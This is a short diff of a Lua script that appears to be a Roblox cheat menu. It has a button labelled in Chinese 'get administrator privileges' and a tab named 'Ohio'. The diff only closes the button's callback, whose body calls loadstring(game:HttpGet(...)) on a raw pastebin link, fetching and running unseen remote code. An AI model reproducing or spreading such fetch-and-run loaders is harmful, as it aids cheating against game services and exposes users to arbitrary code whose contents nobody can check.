@@ -124,7 +124,8 @@ Tab:AddButton({
     Name = "获得管理员权限",
     Callback = function()
 loadstring(game:HttpGet("https://pastebin.com/raw/sZpgTVas"))()
-
+     end 
+})
 local Tab = Window:MakeTab({
     Name = "俄亥俄州",
     Icon = "rbxassetid://93566402708060",
